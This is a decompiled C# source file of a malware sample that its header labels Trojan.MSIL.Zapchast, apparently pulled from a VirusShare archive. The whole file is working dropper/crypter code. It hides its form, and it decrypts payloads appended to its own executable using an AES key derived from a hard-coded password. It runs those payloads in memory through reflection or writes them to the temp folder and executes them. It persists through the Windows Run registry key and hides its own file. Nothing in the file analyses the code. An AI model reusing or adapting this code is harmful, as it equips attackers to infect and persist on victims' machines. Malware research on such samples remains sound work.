// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ShockService, Version=54.69.79.68, Culture=neutral, PublicKeyToken=null
// MVID: F533233C-2DF8-412E-A65B-7D07979BCD7B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Zapchast.f-1818efe183daefdd837f05a5a9f5276f794d594ddec2299f58795c80a56274b8.exe

using \u0003;
using \u0004;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0003
{
  internal class \u0002 : Form
  {
    private IContainer \u0001;
    private Button \u0002;
    private RegistryKey \u0003;
    private byte[] \u0004;
    private Random \u0005;

    public \u0002()
    {
      this.Load += new EventHandler(this.\u0001);
      this.\u0003 = Registry.CurrentUser;
      this.\u0005 = new Random();
      this.\u0001();
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(obj0);
      }
    }

    private void \u0001()
    {
      this.\u0001(new Button());
      this.SuspendLayout();
      this.\u0001().Location = new Point(12, 2);
      this.\u0001().Name = "Button1";
      Button button = this.\u0001();
      Size size1 = new Size(56, 23);
      Size size2 = size1;
      button.Size = size2;
      this.\u0001().TabIndex = 0;
      this.\u0001().Text = "Check";
      this.\u0001().UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(85, 31);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.\u0001());
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = "Form1";
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
    }

    [SpecialName]
    internal virtual Button \u0001() => this.\u0002;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0001([In] Button obj0)
    {
      EventHandler eventHandler = new EventHandler(this.\u0002);
      if (this.\u0002 != null)
        goto label_4;
label_2:
      this.\u0002 = obj0;
      if (this.\u0002 == null)
        return;
      this.\u0002.Click += eventHandler;
      return;
label_4:
      this.\u0002.Click -= eventHandler;
      goto label_2;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void \u0001([In] object obj0, [In] EventArgs obj1)
    {
      string[] strArray = Strings.Split(File.ReadAllText(Application.ExecutablePath), "CwXBSrQ1Vb");
      string s = Conversions.ToString(\u0002.\u0001(strArray[1], "Peggioones"));
      this.\u0004 = Encoding.Default.GetBytes(s);
      this.\u0002();
      if (Conversions.ToBoolean(strArray[2]))
      {
        Conversions.ToString(\u0002.\u0001(strArray[3], "Peggioones"));
        Encoding.Default.GetBytes(s);
        File.WriteAllBytes(Path.GetTempPath() + "\\" + strArray[4], this.\u0004);
        Process.Start(Path.GetTempPath() + "\\" + strArray[4]);
      }
      if (Conversions.ToBoolean(strArray[5]))
      {
        File.Copy(Application.ExecutablePath, Path.GetTempPath() + "Serve.exe", true);
        this.\u0003.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue("Serve", (object) (Path.GetTempPath() + "Serve.exe"), RegistryValueKind.String);
      }
      if (Conversions.ToBoolean(strArray[6]))
      {
        try
        {
          File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (!Conversions.ToBoolean(strArray[7]))
        ;
      ProjectData.EndApp();
    }

    public void \u0002() => RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(\u0002.\u0001()).GetType("Function1.Fuck").GetMethod("You").Invoke((object) null, new object[1]
    {
      (object) this.\u0004
    })));

    public static object \u0001([In] string obj0, [In] string obj1)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(obj1, salt);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
      try
      {
        byte[] buffer = Convert.FromBase64String(obj0);
        cryptoStream.Write(buffer, 0, buffer.Length);
        cryptoStream.Close();
        obj0 = Encoding.UTF8.GetString(memoryStream.ToArray());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) obj0;
    }

    private void \u0002([In] object obj0, [In] EventArgs obj1)
    {
    }
  }
}
